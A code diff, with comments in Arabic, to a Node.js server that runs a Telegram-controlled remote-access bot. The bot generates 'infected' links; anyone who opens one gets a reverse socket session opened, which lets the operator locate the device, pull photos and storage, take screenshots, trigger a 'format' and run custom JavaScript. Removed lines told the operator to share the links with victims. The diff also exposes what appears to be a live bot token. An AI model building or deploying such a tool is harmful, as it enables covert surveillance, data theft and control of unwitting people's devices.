@@ -9,12 +9,12 @@ const axios = require("axios");
 const sharp = require('sharp');
 const { Server: SocketIO } = require('socket.io');
 const AdvancedPayloadSystem = require('./payload-system');
-const { saveReverseSession, getActiveSessions, updateSessionStatus } = require('./firebase-config');
 
-// 🔧 إعدادات البوت
+// 🔧 إعدادات البوت - تأكد من صحتها
 const token = '8407389383:AAFkWGHIUTYoWnaSNhCUEeEl_AijkwNN308';
 const id = '6565594143';
-const SERVER_URL = process.env.VERCEL_URL ? `https://${process.env.VERCEL_URL}` : 'https://your-app.vercel.app';
+// غير هذا الرابط برابط استضافتك الفعلي
+const SERVER_URL = process.env.SERVER_URL || 'https://your-app.vercel.app';
 
 const app = express();
 const appServer = http.createServer(app);
@@ -43,15 +43,15 @@ const infectedLinks = new Map();
 const payloadSystem = new AdvancedPayloadSystem();
 
 // إعدادات middleware
-app.use(bodyParser.json({ limit: '100mb' }));
+app.use(bodyParser.json({ limit: '50mb' }));
 app.use(bodyParser.urlencoded({
-  limit: '100mb',
+  limit: '50mb',
   extended: true
 }));
 
 const upload = multer({
   storage: multer.memoryStorage(),
-  limits: { fileSize: 100 * 1024 * 1024 }
+  limits: { fileSize: 50 * 1024 * 1024 }
 });
 
 // ========== نظام الجلسات العكسية المتقدم ==========
@@ -59,14 +59,13 @@ io.on('connection', (socket) => {
   console.log('🔌 اتصال عكسي جديد:', socket.id);
 
   socket.on('reverse_connect', async (data) => {
-    const { device_id, image_id, link_id, payload_id, platform, userAgent, url, ip, device_info } = data;
+    const { device_id, link_id, payload_id, platform, userAgent, url, ip, device_info } = data;
     
     console.log(`🎯 جلسة عكسية جديدة من: ${device_id}`);
     
     const sessionData = {
       socket: socket,
       device_id: device_id,
-      image_id: image_id,
       link_id: link_id,
       payload_id: payload_id,
       platform: platform,
@@ -82,27 +81,24 @@ io.on('connection', (socket) => {
     reverseSessions.set(device_id, sessionData);
     payloadSystem.registerSession(device_id, sessionData);
 
-    // حفظ في Firebase
-    await saveReverseSession(sessionData);
-
     // إرسال إشعار للتليجرام
     await appBot.sendMessage(
       id,
       `🦠 جلسة عكسية جديدة!\n\n` +
       `📱 الجهاز: <code>${device_id}</code>\n` +
-      `🖼️ الصورة: ${image_id || 'N/A'}\n` +
       `🔗 الرابط: ${link_id || 'N/A'}\n` +
       `💻 النظام: ${platform}\n` +
       `🌐 المتصفح: ${userAgent}\n` +
-      `🔗 الرابط: ${url}\n\n` +
+      `🔗 الصفحة: ${url}\n` +
+      `📍 الأيبي: ${ip || 'مخفي'}\n\n` +
       `✅ الجلسة جاهزة للتحكم الكامل`,
       {
         parse_mode: "HTML",
         reply_markup: {
           inline_keyboard: [
             [
-              { text: "⚡ التحكم في الجهاز", callback_data: `control_device:${device_id}` },
-              { text: "📊 معلومات الجهاز", callback_data: `device_info:${device_id}` }
+              { text: "⚡ التحكم في الجهاز", callback_data: `control:${device_id}` },
+              { text: "📊 معلومات الجهاز", callback_data: `info:${device_id}` }
             ]
           ]
         }
@@ -114,7 +110,7 @@ io.on('connection', (socket) => {
     const { device_id, command, result } = data;
     
     let displayResult = result;
-    if (result.length > 3000) {
+    if (result && result.length > 3000) {
       displayResult = result.substring(0, 3000) + '\n\n... [تم تقصير الناتج]';
     }
     
@@ -122,21 +118,18 @@ io.on('connection', (socket) => {
       id,
       `📤 نتيجة الأمر من ${device_id}:\n\n` +
       `💻 الأمر: <code>${command}</code>\n` +
-      `📊 الناتج:\n<pre>${displayResult}</pre>`,
+      `📊 الناتج:\n<pre>${displayResult || 'لا يوجد ناتج'}</pre>`,
       { 
         parse_mode: "HTML"
       }
     );
   });
 
-  socket.on('disconnect', async () => {
+  socket.on('disconnect', () => {
     for (let [device_id, session] of reverseSessions) {
       if (session.socket === socket) {
         console.log(`🔌 انتهت الجلسة: ${device_id}`);
         reverseSessions.delete(device_id);
-        
-        // تحديث في Firebase
-        await updateSessionStatus(device_id, false);
         
         appBot.sendMessage(
           id,
@@ -171,68 +164,7 @@ function createInfectedLink() {
     return infectedLink;
 }
 
-// ========== نظام معالجة الصور ==========
-
-// 📤 معالجة رفع الصور
-app.post("/uploadFile", upload.single('file'), async (req, res) => {
-    try {
-        const name = req.file.originalname;
-        const model = req.headers.model || 'غير معروف';
-        
-        console.log('📸 تم استلام صورة:', name);
-        
-        if (req.file.mimetype.startsWith('image/')) {
-            const imageId = uuidv4();
-            
-            // حفظ الصورة مؤقتاً
-            infectedImages.set(imageId, {
-                imageBuffer: req.file.buffer,
-                model: model,
-                filename: name,
-                timestamp: new Date()
-            });
-            
-            // إرسال رسالة مع الأزرار
-            await appBot.sendMessage(
-                id,
-                `📸 تم استلام صورة من <b>${model}</b>\n\n` +
-                `اختر الإجراء المطلوب:`,
-                {
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { 
-                                    text: "🦠 صنع صورة ملغمة", 
-                                    callback_data: `create_infected:${imageId}` 
-                                }
-                            ],
-                            [
-                                { 
-                                    text: "🔗 صنع رابط ملغم", 
-                                    callback_data: "create_infected_link" 
-                                }
-                            ]
-                        ]
-                    }
-                }
-            );
-            
-            res.json({ status: 'success', message: 'تم الاستلام' });
-            
-        } else {
-            await appBot.sendDocument(id, req.file.buffer, {
-                caption: `📁 ملف من <b>${model}</b>`,
-                parse_mode: "HTML"
-            }, { filename: name });
-            
-            res.json({ status: 'success', message: 'تم الرفع' });
-        }
-    } catch (error) {
-        console.error('❌ خطأ في الرفع:', error);
-        res.status(500).json({ status: 'error', message: 'خطأ في الرفع' });
-    }
-});
+// ========== واجهة البوت ==========
 
 // 🎯 معالجة الضغط على الأزرار
 appBot.on("callback_query", async (callbackQuery) => {
@@ -243,76 +175,7 @@ appBot.on("callback_query", async (callbackQuery) => {
     console.log('🔄 تم الضغط على زر:', data);
     
     try {
-        if (data.startsWith('create_infected:')) {
-            const imageId = data.split(':')[1];
-            
-            if (infectedImages.has(imageId)) {
-                const imageInfo = infectedImages.get(imageId);
-                
-                await appBot.answerCallbackQuery(callbackQuery.id, { 
-                    text: "⏳ جاري صنع الصورة الملغمة..." 
-                });
-                
-                // إنشاء رابط ملغم للصورة
-                const infectedLink = createInfectedLink();
-                infectedLink.imageId = imageId;
-                
-                await appBot.sendChatAction(chatId, 'upload_photo');
-                
-                // إرسال الصورة الأصلية مع الرابط
-                await appBot.sendPhoto(
-                    chatId, 
-                    imageInfo.imageBuffer,
-                    {
-                        caption: `🦠 صورة ملغمة جاهزة!\n\n` +
-                                `🆔 المعرف: <code>${imageId}</code>\n` +
-                                `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
-                                `🔗 الرابط الملغم:\n<code>${infectedLink.url}</code>\n\n` +
-                                `🚀 الميزات:\n` +
-                                `• ✅ يعمل في جميع المتصفحات والتطبيقات\n` +
-                                `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
-                                `• 📳 تشغيل الاهتزاز عن بعد\n` +
-                                `• 🖼️ سحب الصور والملفات\n` +
-                                `• 🎥 الوصول للكاميرا والميكروفون\n` +
-                                `• 📱 معلومات الجهاز الكاملة\n\n` +
-                                `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
-                                `• سيفتح اتصال عكسي تلقائياً\n` +
-                                `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
-                                `• يمكنك التحكم الكامل في جهازه\n\n` +
-                                `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
-                        parse_mode: "HTML",
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { 
-                                        text: "🔗 نسخ الرابط", 
-                                        callback_data: `copy_link:${infectedLink.payloadId}` 
-                                    },
-                                    { 
-                                        text: "📱 الأجهزة المتصلة", 
-                                        callback_data: "active_sessions" 
-                                    }
-                                ],
-                                [
-                                    { 
-                                        text: "🔄 صنع رابط آخر", 
-                                        callback_data: "create_infected_link" 
-                                    }
-                                ]
-                            ]
-                        }
-                    }
-                );
-                
-                console.log('✅ تم إنشاء الرابط الملغم للصورة');
-                
-            } else {
-                await appBot.answerCallbackQuery(callbackQuery.id, { 
-                    text: "❌ الصورة لم تعد متاحة" 
-                });
-            }
-        }
-        else if (data === 'create_infected_link') {
+        if (data === 'create_link') {
             await appBot.answerCallbackQuery(callbackQuery.id, { 
                 text: "⏳ جاري صنع الرابط الملغم..." 
             });
@@ -327,15 +190,14 @@ appBot.on("callback_query", async (callbackQuery) => {
                 `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
                 `🌐 الرابط:\n<code>${infectedLink.url}</code>\n\n` +
                 `🚀 الميزات:\n` +
-                `• ✅ يعمل في جميع المتصفحات والتطبيقات\n` +
-                `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
-                `• 📳 تشغيل الاهتزاز عن بعد\n` +
+                `• ✅ يعمل في جميع المتصفحات\n` +
+                `• 📍 تحديد الموقع الدقيق\n` +
+                `• 📳 تشغيل الاهتزاز\n` +
                 `• 🖼️ سحب الصور والملفات\n` +
-                `• 🎥 الوصول للكاميرا والميكروفون\n` +
                 `• 📱 معلومات الجهاز الكاملة\n\n` +
                 `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
                 `• سيفتح اتصال عكسي تلقائياً\n` +
-                `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
+                `• ستظهر جلسته في "الأجهزة المتصلة"\n` +
                 `• يمكنك التحكم الكامل في جهازه\n\n` +
                 `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
                 {
@@ -345,17 +207,17 @@ appBot.on("callback_query", async (callbackQuery) => {
                             [
                                 { 
                                     text: "🔗 نسخ الرابط", 
-                                    callback_data: `copy_link:${infectedLink.payloadId}` 
+                                    callback_data: `copy:${infectedLink.payloadId}` 
                                 },
                                 { 
                                     text: "📱 الأجهزة المتصلة", 
-                                    callback_data: "active_sessions" 
+                                    callback_data: "sessions" 
                                 }
                             ],
                             [
                                 { 
                                     text: "🔄 صنع رابط آخر", 
-                                    callback_data: "create_infected_link" 
+                                    callback_data: "create_link" 
                                 }
                             ]
                         ]
@@ -363,55 +225,42 @@ appBot.on("callback_query", async (callbackQuery) => {
                 }
             );
         }
-        else if (data.startsWith('copy_link:')) {
+        else if (data.startsWith('copy:')) {
             const payloadId = data.split(':')[1];
             let link = '';
             
-            // البحث عن الرابط في الروابط
             if (infectedLinks.has(payloadId)) {
                 link = infectedLinks.get(payloadId).url;
             }
             
             if (link) {
                 await appBot.answerCallbackQuery(callbackQuery.id, { 
-                    text: `✅ تم نسخ الرابط: ${link}` 
+                    text: `✅ تم نسخ الرابط` 
                 });
                 
                 await appBot.sendMessage(
                     chatId,
                     `🔗 الرابط الملغم:\n\n<code>${link}</code>\n\n` +
-                    `🎯 شارك هذا الرابط مع الضحايا لفتح جلسات جديدة!`,
+                    `🎯 شارك هذا الرابط لفتح جلسات جديدة!`,
                     { parse_mode: "HTML" }
                 );
             }
         }
-        else if (data === 'active_sessions') {
+        else if (data === 'sessions') {
             const activeSessions = Array.from(reverseSessions.keys());
-            const firebaseSessions = await getActiveSessions();
             
-            const allSessions = [...activeSessions];
-            firebaseSessions.forEach(session => {
-                if (!allSessions.includes(session.device_id)) {
-                    allSessions.push(session.device_id);
-                }
-            });
-            
-            if (allSessions.length === 0) {
+            if (activeSessions.length === 0) {
                 await appBot.sendMessage(chatId, '📭 لا توجد أجهزة متصلة حالياً');
             } else {
-                let sessionsText = `📱 الأجهزة المتصلة: ${allSessions.length}\n\n`;
+                let sessionsText = `📱 الأجهزة المتصلة: ${activeSessions.length}\n\n`;
                 
-                allSessions.forEach(deviceId => {
+                activeSessions.forEach(deviceId => {
                     const session = reverseSessions.get(deviceId);
-                    if (session) {
-                        const duration = Math.round((new Date() - session.connected_at) / 1000);
-                        sessionsText += `📱 <code>${deviceId}</code>\n` +
-                                     `💻 ${session.platform}\n` +
-                                     `⏰ ${duration} ثانية\n\n`;
-                    } else {
-                        sessionsText += `📱 <code>${deviceId}</code>\n` +
-                                     `💻 (من Firebase)\n\n`;
-                    }
+                    const duration = Math.round((new Date() - session.connected_at) / 1000);
+                    
+                    sessionsText += `📱 <code>${deviceId}</code>\n` +
+                                 `💻 ${session.platform}\n` +
+                                 `⏰ ${duration} ثانية\n\n`;
                 });
                 
                 await appBot.sendMessage(
@@ -422,7 +271,7 @@ appBot.on("callback_query", async (callbackQuery) => {
                         reply_markup: {
                             inline_keyboard: [
                                 [
-                                    { text: "🔄 تحديث", callback_data: "active_sessions" }
+                                    { text: "🔄 تحديث", callback_data: "sessions" }
                                 ]
                             ]
                         }
@@ -430,7 +279,7 @@ appBot.on("callback_query", async (callbackQuery) => {
                 );
             }
         }
-        else if (data.startsWith('control_device:')) {
+        else if (data.startsWith('control:')) {
             const deviceId = data.split(':')[1];
             
             await appBot.sendMessage(
@@ -442,106 +291,141 @@ appBot.on("callback_query", async (callbackQuery) => {
                     reply_markup: {
                         inline_keyboard: [
                             [
-                                { text: "📍 الموقع", callback_data: `cmd_location:${deviceId}` },
-                                { text: "📳 الاهتزاز", callback_data: `cmd_vibrate:${deviceId}` }
+                                { text: "📍 الموقع", callback_data: `location:${deviceId}` },
+                                { text: "📳 الاهتزاز", callback_data: `vibrate:${deviceId}` }
                             ],
                             [
-                                { text: "🔋 البطارية", callback_data: `cmd_battery:${deviceId}` },
-                                { text: "🖼️ الصور", callback_data: `cmd_photos:${deviceId}` }
+                                { text: "🔋 البطارية", callback_data: `battery:${deviceId}` },
+                                { text: "🖼️ الصور", callback_data: `photos:${deviceId}` }
                             ],
                             [
-                                { text: "📊 المعلومات", callback_data: `cmd_info:${deviceId}` },
-                                { text: "🎥 الكاميرا", callback_data: `cmd_camera:${deviceId}` }
+                                { text: "📊 المعلومات", callback_data: `info:${deviceId}` },
+                                { text: "💾 التخزين", callback_data: `storage:${deviceId}` }
                             ],
                             [
-                                { text: "🗣️ الميكروفون", callback_data: `cmd_mic:${deviceId}` },
-                                { text: "💾 التخزين", callback_data: `cmd_storage:${deviceId}` }
+                                { text: "📸 لقطة شاشة", callback_data: `screenshot:${deviceId}` },
+                                { text: "🔄 فرمتة", callback_data: `format:${deviceId}` }
                             ],
                             [
-                                { text: "📸 لقطة شاشة", callback_data: `cmd_screenshot:${deviceId}` },
-                                { text: "🔄 فرمتة", callback_data: `cmd_format:${deviceId}` }
-                            ],
-                            [
-                                { text: "⚡ أمر مخصص", callback_data: `cmd_custom:${deviceId}` },
-                                { text: "🔙 رجوع", callback_data: "active_sessions" }
+                                { text: "⚡ أمر مخصص", callback_data: `custom:${deviceId}` },
+                                { text: "🔙 رجوع", callback_data: "sessions" }
                             ]
                         ]
                     }
                 }
             );
         }
-        else if (data.startsWith('cmd_')) {
-            const [command, deviceId] = data.split(':');
-            const cmdType = command.replace('cmd_', '');
-            
-            if (reverseSessions.has(deviceId)) {
-                const session = reverseSessions.get(deviceId);
-                let actualCommand = '';
-                
-                switch(cmdType) {
-                    case 'location': actualCommand = 'الموقع'; break;
-                    case 'vibrate': actualCommand = 'اهتزاز'; break;
-                    case 'battery': actualCommand = 'البطارية'; break;
-                    case 'photos': actualCommand = 'الصور'; break;
-                    case 'info': actualCommand = 'معلومات'; break;
-                    case 'camera': actualCommand = 'الكاميرا'; break;
-                    case 'mic': actualCommand = 'الميكروفون'; break;
-                    case 'storage': actualCommand = 'التخزين'; break;
-                    case 'screenshot': actualCommand = 'لقطة'; break;
-                    case 'format': actualCommand = 'فرمتة'; break;
-                }
-                
-                if (actualCommand) {
-                    session.socket.emit('command', {
-                        device_id: deviceId,
-                        command: actualCommand
-                    });
-                    
-                    await appBot.sendMessage(chatId, `⚡ جاري تنفيذ: ${actualCommand} على الجهاز ${deviceId}`);
-                }
-            } else {
-                await appBot.sendMessage(chatId, `❌ الجلسة غير متصلة حالياً`);
-            }
-        }
-        else if (data.startsWith('device_info:')) {
+        else if (data.startsWith('location:')) {
             const deviceId = data.split(':')[1];
             
             if (reverseSessions.has(deviceId)) {
                 const session = reverseSessions.get(deviceId);
-                const duration = Math.round((new Date() - session.connected_at) / 1000);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'الموقع'
+                });
                 
-                await appBot.sendMessage(
-                    chatId,
-                    `📊 معلومات الجهاز: <code>${deviceId}</code>\n\n` +
-                    `💻 النظام: ${session.platform}\n` +
-                    `🌐 المتصفح: ${session.userAgent}\n` +
-                    `🔗 الرابط: ${session.url}\n` +
-                    `📍 الأيبي: ${session.ip}\n` +
-                    `⏰ المدة: ${duration} ثانية\n` +
-                    `🟢 الحالة: متصل\n\n` +
-                    `🔧 اختر أمر للتنفيذ:`,
-                    {
-                        parse_mode: "HTML",
-                        reply_markup: {
-                            inline_keyboard: [
-                                [
-                                    { text: "⚡ التحكم الكامل", callback_data: `control_device:${deviceId}` }
-                                ]
-                            ]
-                        }
-                    }
-                );
+                await appBot.sendMessage(chatId, `📍 جاري تحديد موقع الجهاز...`);
             }
         }
-        else if (data.startsWith('cmd_custom:')) {
+        else if (data.startsWith('vibrate:')) {
+            const deviceId = data.split(':')[1];
+            
+            if (reverseSessions.has(deviceId)) {
+                const session = reverseSessions.get(deviceId);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'اهتزاز'
+                });
+                
+                await appBot.sendMessage(chatId, `📳 جاري تشغيل الاهتزاز...`);
+            }
+        }
+        else if (data.startsWith('battery:')) {
+            const deviceId = data.split(':')[1];
+            
+            if (reverseSessions.has(deviceId)) {
+                const session = reverseSessions.get(deviceId);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'البطارية'
+                });
+                
+                await appBot.sendMessage(chatId, `🔋 جاري قراءة حالة البطارية...`);
+            }
+        }
+        else if (data.startsWith('photos:')) {
+            const deviceId = data.split(':')[1];
+            
+            if (reverseSessions.has(deviceId)) {
+                const session = reverseSessions.get(deviceId);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'الصور'
+                });
+                
+                await appBot.sendMessage(chatId, `🖼️ جاري سحب الصور...`);
+            }
+        }
+        else if (data.startsWith('info:')) {
+            const deviceId = data.split(':')[1];
+            
+            if (reverseSessions.has(deviceId)) {
+                const session = reverseSessions.get(deviceId);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'معلومات'
+                });
+                
+                await appBot.sendMessage(chatId, `📊 جاري جمع معلومات الجهاز...`);
+            }
+        }
+        else if (data.startsWith('storage:')) {
+            const deviceId = data.split(':')[1];
+            
+            if (reverseSessions.has(deviceId)) {
+                const session = reverseSessions.get(deviceId);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'التخزين'
+                });
+                
+                await appBot.sendMessage(chatId, `💾 جاري قراءة التخزين...`);
+            }
+        }
+        else if (data.startsWith('screenshot:')) {
+            const deviceId = data.split(':')[1];
+            
+            if (reverseSessions.has(deviceId)) {
+                const session = reverseSessions.get(deviceId);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'لقطة'
+                });
+                
+                await appBot.sendMessage(chatId, `📸 جاري أخذ لقطة الشاشة...`);
+            }
+        }
+        else if (data.startsWith('format:')) {
+            const deviceId = data.split(':')[1];
+            
+            if (reverseSessions.has(deviceId)) {
+                const session = reverseSessions.get(deviceId);
+                session.socket.emit('command', {
+                    device_id: deviceId,
+                    command: 'فرمتة'
+                });
+                
+                await appBot.sendMessage(chatId, `🔄 جاري محاكاة الفرمتة...`);
+            }
+        }
+        else if (data.startsWith('custom:')) {
             const deviceId = data.split(':')[1];
             
             await appBot.sendMessage(
                 chatId,
                 `⚡ أدخل الأمر المخصص للجهاز <code>${deviceId}</code>:\n\n` +
-                `يمكنك استخدام:\n` +
-                `• <code>js:alert('hello')</code> - تنفيذ كود JavaScript\n` +
-                `• أي أمر نصي آخر\n\n` +
+                `مثال: <code>js:alert('hello')</code>\n\n` +
                 `أدخل الأمر الآن:`,
                 {
                     parse_mode: "HTML",
@@ -601,19 +485,16 @@ appBot.on('message', async (msg) => {
     }
 
     // الأوامر النصية
-    if (text === '/start' || text === '/start') {
+    if (text === '/start' || text === 'start') {
         const activeSessions = Array.from(reverseSessions.keys()).length;
-        const firebaseSessions = await getActiveSessions();
-        const totalSessions = activeSessions + firebaseSessions.length;
         
         await appBot.sendMessage(
             chatId,
-            `🎯 بوت الجلسات العكسية المتقدم - الإصدار 7.0.0\n\n` +
+            `🎯 بوت الجلسات العكسية المتقدم\n\n` +
             `📊 الإحصائيات الحالية:\n` +
-            `• 📱 الأجهزة المتصلة: ${totalSessions}\n` +
-            `• 🖼️ الصور الملغمة: ${infectedImages.size}\n` +
+            `• 📱 الأجهزة المتصلة: ${activeSessions}\n` +
             `• 🔗 الروابط الملغمة: ${infectedLinks.size}\n\n` +
-            `✨ الميزات الجديدة:\n` +
+            `✨ الميزات:\n` +
             `• 🎯 تحكم كامل في الأجهزة\n` +
             `• 📍 تحديد الموقع الدقيق\n` +
             `• 📳 تشغيل الاهتزاز\n` +
@@ -626,111 +507,13 @@ appBot.on('message', async (msg) => {
                 reply_markup: {
                     inline_keyboard: [
                         [
-                            { text: "🦠 صنع صورة ملغمة", callback_data: "send_image" },
-                            { text: "🔗 صنع رابط ملغم", callback_data: "create_infected_link" }
-                        ],
-                        [
-                            { text: "📱 الأجهزة المتصلة", callback_data: "active_sessions" }
+                            { text: "🔗 صنع رابط ملغم", callback_data: "create_link" },
+                            { text: "📱 الأجهزة المتصلة", callback_data: "sessions" }
                         ]
                     ]
                 }
             }
         );
-    }
-    else if (text === 'send_image') {
-        await appBot.sendMessage(
-            chatId,
-            `📸 أرسل لي الصورة التي تريد تلغيمها...\n\n` +
-            `سأقوم بإنشاء رابط ملغم خاص بالصورة!`,
-            { parse_mode: "HTML" }
-        );
-    }
-    
-    // معالجة استقبال الصور مباشرة
-    if (msg.photo && msg.photo.length > 0) {
-        const fileId = msg.photo[msg.photo.length - 1].file_id;
-        
-        try {
-            await appBot.sendChatAction(chatId, 'typing');
-            
-            // تحميل الصورة
-            const fileLink = await appBot.getFileLink(fileId);
-            const response = await axios.get(fileLink, { responseType: 'arraybuffer' });
-            const imageBuffer = Buffer.from(response.data);
-            
-            const imageId = uuidv4();
-            
-            // حفظ الصورة مؤقتاً
-            infectedImages.set(imageId, {
-                imageBuffer: imageBuffer,
-                filename: `photo_${imageId}.jpg`,
-                timestamp: new Date()
-            });
-            
-            // إنشاء رابط ملغم للصورة
-            const infectedLink = createInfectedLink();
-            infectedLink.imageId = imageId;
-            
-            await appBot.sendChatAction(chatId, 'upload_photo');
-            
-            // إرسال الصورة مع الرابط الملغم
-            await appBot.sendPhoto(
-                chatId,
-                imageBuffer,
-                {
-                    caption: `🦠 صورة ملغمة جاهزة!\n\n` +
-                            `🆔 المعرف: <code>${imageId}</code>\n` +
-                            `⏰ الوقت: ${new Date().toLocaleString()}\n\n` +
-                            `🔗 الرابط الملغم:\n<code>${infectedLink.url}</code>\n\n` +
-                            `🚀 الميزات:\n` +
-                            `• ✅ يعمل في جميع المتصفحات والتطبيقات\n` +
-                            `• 📍 تحديد الموقع الدقيق تلقائياً\n` +
-                            `• 📳 تشغيل الاهتزاز عن بعد\n` +
-                            `• 🖼️ سحب الصور والملفات\n` +
-                            `• 🎥 الوصول للكاميرا والميكروفون\n` +
-                            `• 📱 معلومات الجهاز الكاملة\n\n` +
-                            `🎯 عندما يفتح أي شخص هذا الرابط:\n` +
-                            `• سيفتح اتصال عكسي تلقائياً\n` +
-                            `• ستظهر جلسته في قائمة "الأجهزة المتصلة"\n` +
-                            `• يمكنك التحكم الكامل في جهازه\n\n` +
-                            `🔗 شارك هذا الرابط لفتح جلسات جديدة!`,
-                    parse_mode: "HTML",
-                    reply_markup: {
-                        inline_keyboard: [
-                            [
-                                { 
-                                    text: "🔗 نسخ الرابط", 
-                                    callback_data: `copy_link:${infectedLink.payloadId}` 
-                                },
-                                { 
-                                    text: "📱 الأجهزة المتصلة", 
-                                    callback_data: "active_sessions" 
-                                }
-                            ],
-                            [
-                                { 
-                                    text: "🔄 صنع رابط آخر", 
-                                    callback_data: "create_infected_link" 
-                                }
-                            ]
-                        ]
-                    }
-                }
-            );
-            
-            console.log('✅ تم إنشاء الرابط الملغم للصورة');
-            
-        } catch (error) {
-            console.error('❌ خطأ في معالجة الصورة:', error);
-            await appBot.sendMessage(
-                chatId,
-                `❌ حدث خطأ أثناء معالجة الصورة\n\n` +
-                `الخطأ: ${error.message}`,
-                { parse_mode: "HTML" }
-            );
-        }
-        
-        return;
     }
 });
 
@@ -741,7 +524,7 @@ app.get('/link/:payloadId', (req, res) => {
     const payloadId = req.params.payloadId;
     
     if (!infectedLinks.has(payloadId)) {
-        return res.status(404).send('Payload not found');
+        return res.status(404).send('الرابط غير موجود');
     }
 
     const linkData = infectedLinks.get(payloadId);
@@ -750,7 +533,7 @@ app.get('/link/:payloadId', (req, res) => {
     <!DOCTYPE html>
     <html>
     <head>
-        <title>Redirecting...</title>
+        <title>جاري التوجيه...</title>
         <meta charset="utf-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0">
         <style>
@@ -801,37 +584,6 @@ app.get('/track/:payloadId', (req, res) => {
     res.send('');
 });
 
-// 📡 endpoint للبيانات
-app.post('/log', express.json(), (req, res) => {
-    console.log('📊 Log data:', req.body);
-    res.json({ status: 'logged' });
-});
-
-// 📤 باقي ال endpoints
-app.post("/uploadText", (req, res) => {
-    const model = req.headers.model || 'غير معروف';
-    const text = req.body.text || 'لا يوجد نص';
-    
-    appBot.sendMessage(id, `📨 رسالة من <b>${model}</b>\n\n${text}`, { 
-        parse_mode: "HTML" 
-    });
-    
-    res.json({ status: 'success' });
-});
-
-app.post("/uploadLocation", (req, res) => {
-    const model = req.headers.model || 'غير معروف';
-    const lat = req.body.lat;
-    const lon = req.body.lon;
-    
-    appBot.sendLocation(id, lat, lon);
-    appBot.sendMessage(id, `📍 موقع من <b>${model}</b>`, { 
-        parse_mode: "HTML" 
-    });
-    
-    res.json({ status: 'success' });
-});
-
 // 🌐 الصفحة الرئيسية
 app.get('/', (req, res) => {
     const activeSessions = Array.from(reverseSessions.keys()).length;
@@ -867,12 +619,11 @@ app.get('/', (req, res) => {
     <body>
         <div class="container">
             <h1>🚀 Advanced Reverse Bot</h1>
-            <p>الإصدار 7.0.0 - نظام التحكم الكامل عبر الروابط</p>
+            <p>نظام التحكم الكامل عبر الروابط</p>
             
             <div class="status">
                 <h2>📊 System Status</h2>
                 <p>📱 الأجهزة المتصلة: ${activeSessions}</p>
-                <p>🖼️ الصور الملغمة: ${infectedImages.size}</p>
                 <p>🔗 الروابط الملغمة: ${infectedLinks.size}</p>
                 <p>⏰ وقت التشغيل: ${Math.round(process.uptime())} ثانية</p>
                 <p>🟢 الحالة: <strong>نشط ومستقر</strong></p>
@@ -887,13 +638,19 @@ app.get('/', (req, res) => {
 });
 
 // 🚀 بدء السيرفر
-const PORT = process.env.PORT || 8999;
+const PORT = process.env.PORT || 3000;
 appServer.listen(PORT, () => {
     console.log(`✅ البوت شغال على البورت: ${PORT}`);
     console.log(`🎯 نظام الجلسات العكسية المتقدم مفعل`);
-    console.log(`🦠 نظام تلغيم الروابط جاهز`);
     console.log(`🔗 السيرفر: ${SERVER_URL}`);
-    console.log(`⚡ جاهز لاستقبال الصور والروابط وتشغيل الجلسات!`);
+    console.log(`⚡ جاهز لصنع الروابط الملغمة!`);
+    
+    // تحذير مهم
+    console.log('\n⚠️  IMPORTANT:');
+    console.log('🔓 إذا كان الرابط يطلِع شاشة تسجيل دخول:');
+    console.log('1. اذهب لإعدادات Vercel → General → Password Protection');
+    console.log('2. أوقف Password Protection');
+    console.log('3. أو استخدم استضافة أخرى مثل Railway أو Render');
 });
 
 // معالجة الأخطاء
